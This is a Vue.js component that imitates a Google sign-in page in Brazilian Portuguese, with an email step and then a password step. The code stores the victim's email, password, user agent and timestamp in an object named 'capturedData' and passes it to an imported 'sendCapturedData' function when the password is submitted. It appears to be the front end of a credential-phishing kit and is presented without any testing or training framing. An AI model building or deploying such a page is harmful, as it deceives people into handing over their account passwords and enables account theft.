<template>
  <div class="app">
    <div class="container">
      <div class="login-card">
        <div class="google-logo">
          <GoogleLogo />
        </div>
        
        <LoginForm 
          v-if="currentStep === 'email'"
          @email-submitted="handleEmailSubmit"
        />
        
        <PasswordForm 
          v-else-if="currentStep === 'password'"
          :email="capturedData.email"
          @password-submitted="handlePasswordSubmit"
          @back-to-email="currentStep = 'email'"
        />
      </div>
      
      <footer>
        <div class="language-selector">
          <select>
            <option>Português (Brasil)</option>
          </select>
        </div>
        <div class="footer-links">
          <a href="#">Ajuda</a>
          <a href="#">Privacidade</a>
          <a href="#">Termos</a>
        </div>
      </footer>
    </div>
  </div>
</template>

<script>
import { ref, reactive } from 'vue'
import LoginForm from './components/LoginForm.vue'
import PasswordForm from './components/PasswordForm.vue'
import GoogleLogo from './components/GoogleLogo.vue'
import { sendCapturedData } from './services/api'

export default {
  name: 'App',
  components: {
    LoginForm,
    PasswordForm,
    GoogleLogo
  },
  setup() {
    const currentStep = ref('email')
    const capturedData = reactive({
      email: '',
      password: '',
      timestamp: '',
      userAgent: navigator.userAgent,
      ip: ''
    })

    const handleEmailSubmit = async (email) => {
      capturedData.email = email
      capturedData.timestamp = new Date().toISOString()
      currentStep.value = 'password'
    }

    const handlePasswordSubmit = async (password) => {
      capturedData.password = password
      await sendCapturedData(capturedData)
    }

    return {
      currentStep,
      capturedData,
      handleEmailSubmit,
      handlePasswordSubmit
    }
  }
}
</script>